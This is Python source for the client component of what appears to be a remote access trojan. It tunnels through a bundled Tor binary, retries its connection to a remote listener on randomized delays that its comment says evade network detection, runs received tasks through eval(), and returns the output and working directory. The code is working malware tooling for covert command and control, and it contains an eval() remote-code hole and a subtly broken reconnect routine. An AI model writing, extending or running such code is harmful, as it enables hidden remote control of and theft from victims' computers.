import socks
import socket
import subprocess as sp
import os
import sys
from time import sleep
from random import randint


class Tor:
    """
    A class to interact with the tor expert bundle.
    Note: The stem library could be used to interact with tor.
    """
    TOR_PATH_WIN = '.\\torbundle\\Tor\\tor.exe'
    TOR_PATH_LINUX = './tor_linux/tor'

    def __init__(self):
        self.tor_process = self.start()
        socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9050)
        socket.socket = socks.socksocket

    def start(self):
        try:
            if os.name == 'nt':
                path = Tor.resource_path(self.TOR_PATH_WIN)
            else:
                path = Tor.resource_path(self.TOR_PATH_LINUX)
                sp.Popen(['chmod', '+x', path])
            tor_process = sp.Popen(path, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
            print(tor_process.stdout.read() + tor_process.stderr.read())
        except Exception as error:
            print(str(error))
            sys.exit(1)
        return tor_process

    @staticmethod
    def resource_path(relative_path):
        # Get absolute path to resource, works for dev and for PyInstaller
        # needed because the path of the tor expert bundle changes due to pyinstaller
        base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
        return os.path.join(base_path, relative_path)


class ClientSocket:
    """
    A class to handle the client socket.
    """
    ENCODING = 'utf-8'
    # timout in seconds between every connection try
    CONNECTION_TIMEOUT = 30

    def __init__(self, remote_host, remote_port):
        self.remote_addr = (remote_host, remote_port)
        self.__sock = self.create_connection()

    def create_connection(self):
        """
        Recursively try to connect to the listener until it works,
        then return socket object.
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(self.remote_addr)
        except socket.error as err:
            print(err)
            # randomize connection timeout to avoid network detection
            timeout = randint(self.CONNECTION_TIMEOUT - 10, self.CONNECTION_TIMEOUT + 10)
            sleep(timeout)
            self.create_connection()
        else:
            return sock

    def send(self, output):
        """
        The client always sends back the output of the received task,
        and the current working directory.
        """
        try:
            cwd = os.getcwd()
            data = {'output': output, 'cwd': cwd}
            self.__sock.send(str(data).encode(self.ENCODING))
        except socket.error:
            raise()

    def receive(self, num_bytes):
        """
        The client receives a dictionary containing a task,
        and a list of optional arguments, dependent on the task.
        """
        try:
            data = self.__sock.recv(num_bytes)
            data = data.decode(self.ENCODING)
            data = eval(data)
        except socket.error:
            raise()
        else:
            return data['task'], data['args']

    def __del__(self):
        try:
            self.__sock.close()
        except NameError:
            pass
